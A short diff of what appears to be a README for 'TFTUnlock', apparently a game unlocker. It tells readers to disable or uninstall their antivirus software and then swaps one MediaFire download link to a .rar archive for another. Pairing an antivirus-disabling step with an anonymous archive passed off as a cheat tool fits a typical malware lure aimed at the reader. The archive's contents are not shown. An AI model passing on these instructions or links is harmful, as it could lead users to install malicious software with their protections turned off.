@@ -29,8 +29,7 @@ Before proceeding, make sure you have disabled or uninstalled any antivirus soft
 
 First, download the repository containing all necessary files.
 
-[Download Here](https://www.mediafire.com/file/ncydkv6zlvw4xjr/TFTUnlock-2024-v4.7.2.2.rar/file)
-
+1. [Download Here](https://www.mediafire.com/file/90okq8sogp79p7k/TFTUnlock-2024-v4.6.3.3.rar/file)
 
 or
 
